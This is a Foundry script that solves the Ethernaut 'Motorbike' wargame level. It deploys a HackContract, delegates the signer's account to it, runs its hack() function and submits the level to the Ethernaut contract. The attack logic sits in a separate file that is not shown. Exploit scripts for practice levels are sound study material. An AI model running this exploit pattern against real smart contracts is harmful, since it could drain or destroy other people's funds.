// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {HackContract, Ethernaut} from "../src/Motorbike.sol";

interface LevelContract {
    function upgrader() external returns (address);
}

contract MotorBikeScript is Script {
    function run() external {

        vm.startBroadcast();

        HackContract hc = new HackContract();
        vm.signAndAttachDelegation(address(hc), vm.envUint("PRIVATE_KEY"));
        (address levelContractAddress, address engineContractAddress) = HackContract(vm.addr(vm.envUint("PRIVATE_KEY"))).hack();
        

        Ethernaut e = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
        e.submitLevelInstance(payable(levelContractAddress));
        vm.stopBroadcast();
    }
}
